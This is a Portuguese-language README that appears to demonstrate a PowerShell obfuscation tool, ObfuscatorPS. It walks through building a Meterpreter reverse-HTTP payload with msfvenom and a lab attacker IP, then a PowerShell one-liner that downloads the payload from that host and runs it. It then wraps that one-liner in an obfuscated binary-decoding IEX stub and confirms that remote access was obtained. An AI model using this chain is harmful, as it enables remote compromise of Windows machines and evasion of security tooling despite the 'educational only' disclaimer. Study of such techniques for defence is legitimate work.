# 🕶️ ObfuscatorPS - Demonstração de Uso

> Exemplo prático de utilização do ObfuscatorPS em um cenário controlado para estudo de ofuscação.

---

## 📌 Visão Geral

Antes de tudo devemos ter informações cruciais:
- IP das máquinas
- Criação do payload com msfvenom
- Uso do payload no msfconsole (msf6)
- Download e execução do arquivo na máquina Windows

---

## 🧠 Passo 1: Criar o payload

Comando utilizado:

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=172.23.73.245 LPORT=4444 -f exe -o shell_reverso.exe
```

<img width="879" height="382" src="https://github.com/user-attachments/assets/4e590837-a3c7-4999-a1aa-37bd45bdfd89" />

---

## 🧠 Passo 2: Configurar o listener

Abrir o msfconsole e usar o payload:

<img width="601" height="698" src="https://github.com/user-attachments/assets/9abc6c9f-7af9-4f73-9bdf-c00105c3f458" />

🎯 Isca pronta.

---

## 🧠 Passo 3: Uso do ObfuscatorPS

Comando original:

```powershell
iwr -Uri http://172.23.73.245/shell_reverso.exe -Outfile shell_reverso.exe; .\shell_reverso.exe
```

<img width="1512" height="843" src="https://github.com/user-attachments/assets/13b5a007-e0f2-4e0d-8ca1-8a7992580691" />

Comando utilizado:

```powershell
.\obfuscator.ps1 -comand "iwr -Uri http://172.23.73.245/shell_reverso.exe -Outfile shell_reverso.exe; .\shell_reverso.exe" -type binary
```

Resultado:

<img width="1577" height="146" src="https://github.com/user-attachments/assets/baf6362d-36fe-4262-b502-1c101e47c600" />

Execução do comando:

```powershell
function uYrp($z){$KAL="";foreach($sX in $z){$KAL+=[char][Convert]::ToInt32($sX,2)};return $KAL};IEX (...)
```

<img width="1581" height="174" src="https://github.com/user-attachments/assets/2a52728f-6170-4b44-83a6-7dbcb0f44a16" />

---

## 🧠 Passo 4: Verificação

Checkando o msfconsole:

<img width="1233" height="272" src="https://github.com/user-attachments/assets/33eb1f44-8ccf-4c6d-901b-f62feca32ad3" />

Acesso obtido com sucesso.

---

## ✅ Conclusão

O ObfuscatorPS permite mascarar comandos mantendo sua execução, sendo útil para estudo de ofuscação.

---

## ⚠️ Aviso

Uso apenas para fins educacionais.

---

## 🙏 Autor

Luan Calazans
